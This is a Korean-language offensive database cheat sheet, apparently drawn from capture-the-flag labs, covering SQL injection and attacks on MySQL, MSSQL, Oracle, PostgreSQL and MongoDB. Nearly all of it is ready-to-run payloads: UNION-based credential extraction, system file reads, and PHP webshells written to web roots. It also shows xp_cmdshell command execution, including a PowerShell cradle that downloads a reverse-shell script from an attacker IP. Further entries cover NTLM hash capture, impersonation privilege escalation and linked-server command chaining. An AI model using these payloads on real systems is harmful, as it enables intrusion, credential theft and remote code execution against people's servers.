<details>
  <summary><strong>SQL Injection</strong></summary>

SQL Injection은 애플리케이션의 입력값 검증 취약점을 이용하여 데이터베이스에 임의의 SQL 쿼리를 실행하는 공격 기법입니다.

- 쿼리 구문을 예상하면서 시도.
- 숫자가 나오면 연산을 시도해서 injection이 일어나는지 테스트.
- 오류 메시지가 안나온다고 해서 인젝션이 안되는 것은 아니다.(`a';-- -` 를 입력해도 쿼리가 정상적으로 작동하여 출력이 될 수 있다.)
- `SELECT * from movie where title like '%test%'` : `%`가 와일드카드 역할을 함.

### 기본 우회 테스트

**주의**: MySQL에서는 AND 연산자가 OR 연산자보다 먼저 평가됩니다.

```sql
# 기본 SQL Injection 탐지
# 작은따옴표(')로 SQL 구문 오류를 유발하여 취약점 존재 여부 확인
# 검증이 제대로 되지 않아서 `이나 '를 사용하지 않아도 인젝션이 가능한 경우가 있다.
admin'

# SQL 주석을 이용한 뒤쪽 쿼리 무효화
admin'-- -      # MySQL 표준 주석 (공백 필요)
admin';-- -     # 세미콜론 포함 버전
admin'#         # MySQL 대체 주석
admin')-- -     # 괄호가 있는 경우
```

### 인증 우회 (Authentication Bypass)

로그인 폼에서 항상 참인 조건을 만들어 인증을 우회합니다.

```sql
# OR '1'='1' 구문을 이용한 항상 참 조건 생성
# 결과: WHERE username='admin' OR '1'='1' AND password='password' OR '1'='1'
username : admin' or '1'='1
password : password' or '1'='1

# 매번 `이나 '를 붙여서 작동하는 것은 아니다.
username : admin or 1=1;-- -
```

### UNION 기반 데이터 추출

UNION을 이용하여 다른 테이블의 데이터를 조회할 수 있습니다.

```sql
# 1단계: 컬럼 개수 파악
# ORDER BY를 이용하여 에러가 발생할 때까지 숫자를 증가
' order by 1-- -
' order by 2-- -
' order by 3-- -
' order by 4-- -

# 2단계: UNION SELECT로 컬럼 매핑
# 각 컬럼 위치에 숫자를 넣어 어느 위치가 화면에 출력되는지 확인
' UNION select 1,2,3-- -
' UNION select 1,2,3,4-- -

# 3단계: 데이터베이스 버전 확인
# @@version: MySQL 버전 정보 출력
' UNION select 1,@@version,3,4-- -

# 4단계: 데이터베이스 목록 조회
# INFORMATION_SCHEMA.SCHEMATA: 모든 데이터베이스 정보를 담고 있는 시스템 테이블
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

# 5단계: 특정 데이터베이스의 테이블 목록 조회
# TABLE_SCHEMA='dev': dev 데이터베이스의 테이블만 필터링
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

# 6단계: 특정 테이블의 컬럼 정보 조회
# INFORMATION_SCHEMA.COLUMNS: 모든 컬럼 정보를 담고 있는 시스템 테이블
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

# 7단계: 실제 데이터 추출
# dev.credentials 테이블의 username과 password 조회
' UNION select 1, username, password, 4 from dev.credentials-- -
```

### 권한 확인 및 파일 접근

FILE 권한을 가진 경우 시스템 파일을 읽거나 쓸 수 있습니다.

```sql
# 현재 사용자 확인
# user(): 현재 MySQL 연결 사용자 반환
' UNION SELECT 1, user(), 3, 4-- -

# 모든 MySQL 사용자 조회
# mysql.user: MySQL 사용자 계정 정보를 저장하는 시스템 테이블
' UNION SELECT 1, user, 3, 4 from mysql.user-- -

# 모든 사용자의 super_priv 권한 확인
# super_priv='Y': 슈퍼유저 권한 보유
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

# root 사용자의 권한 확인
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

# 모든 사용자 권한 조회
# information_schema.user_privileges: 사용자별 부여된 권한 정보
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

# root@localhost의 권한 상세 조회
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

# 시스템 파일 읽기 (Linux)
# LOAD_FILE(): 서버 파일 시스템의 파일을 읽는 함수
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

# Apache 설정 파일 읽기
' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -

# Nginx 설정 파일 읽기
' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -
' UNION SELECT 1, LOAD_FILE("/etc/nginx/sites-enabled/default"), 3, 4-- -

# IIS 설정 파일 읽기 (Windows)
# %WinDir%: Windows 시스템 디렉터리 환경변수
' UNION SELECT 1, LOAD_FILE("%WinDir%\System32\Inetsrv\Config\ApplicationHost.config"), 3, 4-- -
```

### 웹쉘 업로드

- secure_file_priv 설정이 허용하는 경우 파일을 서버에 작성할 수 있습니다.
- `PHP` 내부에서 `''` 대신에 `""`를 사용하여 생성 시도해볼 것.

```sql
# secure_file_priv 설정 확인
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

# 주의: 500 에러가 발생해도 파일이 생성되었을 수 있으므로 확인 필요
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

### Blind SQL Test
```sql
0 UNION select user,2,3 from mysql.user where user like 'a%'-- -

0 UNION select user,2,3 from mysql.user where user like 'r%'-- -
```

### MSSQL
```mssql
500';EXEC xp_dirtree '\\10.10.14.22\test';-- -

500';EXECUTE xp_cmdshell 'ping 10.10.14.22';-- -
```

</details>

---
<details>
  <summary><strong>MySQL</strong></summary>

**기본 포트**: 3306

### 기본 시스템 데이터베이스

```mysql
mysql               # 사용자 계정, 권한, 설정 정보 저장
information_schema  # 데이터베이스 메타데이터 (읽기 전용)
performance_schema  # 서버 성능 모니터링 데이터
sys                 # performance_schema를 쉽게 사용하기 위한 뷰 모음
```

### 파일 읽기 (Read Files)

시스템 파일에 접근하여 민감한 정보를 획득할 수 있습니다.

```mysql
-- /etc/passwd 파일 읽기
-- FILE 권한이 필요하며, secure_file_priv 설정에 따라 제한될 수 있음
select LOAD_FILE("/etc/passwd");
```

**주요 확인 사항**:
- `FILE` 권한 보유 여부
- `secure_file_priv` 설정값 (파일 접근 경로 제한)

---

### 파일 쓰기 (Write Files)

웹쉘을 업로드하여 원격 명령 실행이 가능합니다.

```mysql
-- 파일 쓰기 권한 확인
-- secure_file_priv가 비어있거나 특정 경로로 설정되어 있는지 확인
show variables like "secure_file_priv";

-- 웹쉘 작성
-- 웹 루트 디렉터리에 PHP 웹쉘 파일 생성
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

**활용 방법**:
1. 웹쉘 업로드 후 `http://target-ip/webshell.php?c=whoami` 형태로 접근
2. `c` 파라미터를 통해 시스템 명령 실행

### mysqldump
```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```

</details>

---
<details>
  <summary><strong>MSSQL (Microsoft SQL Server)</strong></summary>

Microsoft의 상용 관계형 데이터베이스 관리 시스템입니다.  
**기본 포트**: 1433

### nxc login test
- `--local-auth`를 붙여서 로그인 시도.
- `AD`환경이 아니면 로그인 시도가 안될 수 있어 `impacket-mssqlclient`로 로그인 테스트.
- `MSSQL`의 관리자 계정은 `sa`. 로그인 테스트가 안될때 추가해서 시도해보기.

### 기본 데이터베이스 구조

MSSQL 설치 시 기본으로 생성되는 시스템 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 저장 (모든 데이터베이스의 마스터 정보) |
| `model` | 새 데이터베이스 생성 시 사용되는 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 스케줄 정보 관리 |
| `tempdb` | 임시 데이터 및 임시 객체 저장 (재시작 시 초기화됨) |
| `resource` | 시스템 객체 저장 (숨김 데이터베이스, 직접 접근 불가) |

---

### 데이터베이스 정보 조회

데이터베이스 구조 및 데이터 파악을 위한 기본 쿼리입니다.

```mssql
-- 모든 데이터베이스 목록 조회
-- sysdatabases 시스템 뷰를 통해 서버의 모든 DB 확인
1> SELECT name FROM master.dbo.sysdatabases
2> GO

select 1,name,DB_NAME(),4,5,6 from master..sysdatabases
SELECT db_name(0)
SELECT db_name(1)

-- 테이블의 이름과 Object ID 조회
select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -

-- 특정 데이터베이스 선택
-- USE 명령으로 작업 대상 데이터베이스 변경
1> USE htbusers
2> GO

-- 테이블 목록 조회
-- INFORMATION_SCHEMA를 통해 메타데이터 확인
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

-- 컬럼 조회
select column_name from streamio.information_schema.columns
select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -

-- 테이블 데이터 조회
-- 실제 저장된 데이터 확인
1> SELECT * FROM users
2> go

SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
```

---
### xp_dirtree
```mssql
-- 내부 폴더 탐색 가능.
EXEC xp_dirtree C:\;
```


### xp_cmdshell을 통한 명령 실행

`xp_cmdshell`은 운영체제 명령을 실행할 수 있는 강력한 저장 프로시저입니다.  
**위험도**: 🔴 매우 높음 (시스템 레벨 명령 실행 가능)

```mssql
-- xp_cmdshell 활성화
-- 기본적으로 보안상 비활성화되어 있으며, sysadmin 권한 필요
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- 명령 실행
-- SQL Server 서비스 계정의 권한으로 OS 명령 실행
EXECUTE xp_cmdshell 'whoami'
GO

EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```
---

### 파일 읽기 (Read Files)

`OPENROWSET`을 사용하여 시스템 파일을 읽을 수 있습니다.

```mssql
-- BULK 옵션을 사용한 파일 읽기
-- SINGLE_CLOB: 파일 전체를 하나의 텍스트로 읽음
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
---

### 파일 쓰기 (Write Files)

OLE Automation을 이용한 파일 생성 및 웹쉘 업로드가 가능합니다.

```mssql
-- OLE Automation 활성화
-- COM 객체를 통한 파일 시스템 접근 허용
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

-- 웹쉘 파일 작성
-- FileSystemObject를 이용한 파일 생성 및 쓰기
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
---
### MSSQL 서비스 해시 캡처

UNC 경로를 이용하여 MSSQL 서비스 계정의 NTLM 해시를 획득할 수 있습니다.

**공격 시나리오**:
1. 공격자가 Responder 또는 SMB 서버 실행
2. MSSQL에서 공격자의 UNC 경로 접근 시도
3. 인증 과정에서 NTLM 해시 캡처
4. 캡처한 해시로 크래킹 또는 Pass-the-Hash 공격

```bash
# Responder를 이용한 해시 캡처
# 네트워크 인터페이스(tun0)에서 대기
sudo responder -I tun0 -v

# 또는 Impacket SMB 서버 실행
# SMB2 지원 및 현재 디렉터리를 공유
sudo impacket-smbserver share ./ -smb2support
```

```mssql
-- UNC 경로 접근을 통한 해시 캡처
-- xp_dirtree: 디렉터리 구조 탐색 (인증 발생)
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

-- xp_subdirs: 하위 디렉터리 조회 (인증 발생)
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```
---

### 사용자 권한 상승 (Impersonation)

`IMPERSONATE` 권한을 이용하여 다른 사용자로 권한을 전환할 수 있습니다.

**개념**: 현재 사용자가 다른 사용자의 권한으로 작업을 수행할 수 있는 기능

```mssql
-- Impersonate 가능한 사용자 확인
-- server_permissions와 server_principals 조인하여 확인
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
6> GO

-- 현재 사용자 및 권한 확인
-- SYSTEM_USER: 현재 로그인 사용자
-- IS_SRVROLEMEMBER('sysadmin'): sysadmin 권한 여부 (1=있음, 0=없음)
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-- sa 계정으로 권한 전환
-- sa: SQL Server의 최고 관리자 계정
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
---

### 연결된 데이터베이스 서버 활용 (Linked Servers)

Linked Server를 통해 다른 데이터베이스 서버와 통신할 수 있습니다.

**개념**: 한 MSSQL 서버에서 다른 데이터베이스 서버의 데이터에 접근하는 기능

```mssql
-- 연결된 서버 목록 조회
-- isremote = 0: linked server를 의미
1> SELECT srvname, isremote FROM sysservers
2> GO

-- 원격 서버에서 명령 실행
-- EXECUTE('query') AT [서버명] 구문 사용
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

-- 원격 서버에서 xp_cmdshell 활성화 및 실행
-- Linked Server를 통한 명령 실행 체이닝
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

-- 원격 서버에서 OS 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]

-- 원격 서버의 파일 읽기
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```

### sqlcmd.exe
```powershell
where.exe sqlcmd

sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

</details>

---
<details>
  <summary><strong>POSTGRESQL(5432)</strong></summary>

### 기본 연결

```bash
# psql 클라이언트를 통한 연결
# -h: 호스트, -p: 포트, -U: 사용자명
psql -h localhost -p 5432 -U christine
```

### 기본 명령어

```psql
# 데이터베이스 목록 조회
\l

# 특정 데이터베이스 선택
\c secrets

# 테이블 목록 조회
\d

# 테이블 데이터 조회
select * from flag;
```
  
</details>

---
<details>
  <summary><strong>Oracle TNS (Transparent Network Substrate)</strong></summary>

Oracle Database의 네트워크 통신 프로토콜입니다.  
**기본 포트**: 1521

### ODAT 도구 사용

ODAT(Oracle Database Attacking Tool)은 Oracle 데이터베이스 보안 평가를 위한 종합 도구입니다.

```bash
# 모든 Oracle 취약점 자동 테스트
# SID, 계정, 권한 상승, 파일 업로드 등 모든 기능 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
# Oracle 클라이언트 라이브러리 경로를 시스템에 등록
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```
---

### SQLPlus를 통한 연결

SQLPlus는 Oracle의 공식 명령줄 클라이언트입니다.

```bash
# 일반 사용자로 연결
# scott/tiger: Oracle의 기본 테스트 계정
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결 (관리자 권한)
# as sysdba: 데이터베이스 관리자 권한으로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```
---

### 파일 업로드 (웹쉘)

`utlfile` 패키지를 이용한 웹쉘 업로드입니다.

```bash
# 웹 디렉터리에 파일 업로드
# --sysdba: SYSDBA 권한으로 실행
# --putFile: 로컬 파일을 원격 서버로 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
---

### 유용한 SQL 쿼리

데이터베이스 정보 수집 및 권한 확인을 위한 쿼리입니다.

```sql
-- 모든 테이블 조회
-- all_tables: 현재 사용자가 접근 가능한 모든 테이블
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
-- user_role_privs: 사용자에게 부여된 역할 및 권한
SELECT * FROM user_role_privs;

-- 사용자 계정 및 비밀번호 해시 조회
-- sys.user$: 시스템 사용자 정보 (DBA 권한 필요)
SELECT name, password FROM sys.user$;
```

</details>

---
<details>
  <summary><strong>MongoDB (27017)</strong></summary>

### Mongosh (MongoDB Shell)
```bash
# MongoDB 서버 연결
mongosh --host 10.129.5.3

# 또는 인증 정보와 함께 연결
mongosh "mongodb://username:password@10.129.5.3:27017/admin"
```

### 기본 명령어

```javascript
// 데이터베이스 목록 확인
test> show dbs;

// 특정 데이터베이스 선택
test> use sensitive_information;

// 컬렉션(테이블) 목록 확인
sensitive_information> show collections;

// 컬렉션의 모든 문서 조회
sensitive_information> db.flag.find()

// 특정 조건으로 문서 조회
db.users.find({role: "admin"})

// 문서 개수 확인
db.users.countDocuments()
```

### 데이터 조작

```javascript
// 문서 삽입
db.users.insertOne({name: "test", password: "test123"})

// 문서 업데이트
ace> db.admin.updateOne(
  {name:'administrator'},
  {$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}}
);

// 문서 삭제
db.users.deleteOne({name: "test"})
```

</details>

---
<details>
  <summary><strong>SQLMAP</strong></summary>

- `SQLMAP`으로 웹소켓 인젝션이 가능하다.
- `JSON` 데이터를 전달할 때는 따옴표를 사용하여 전달해줘야 한다.
- 덤핑할때는 쓰레드 5개까지는 괜찮은 것 같다.
- `HTTPS` 전달시 `--force-ssl`사용
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}'
```
  
</details>
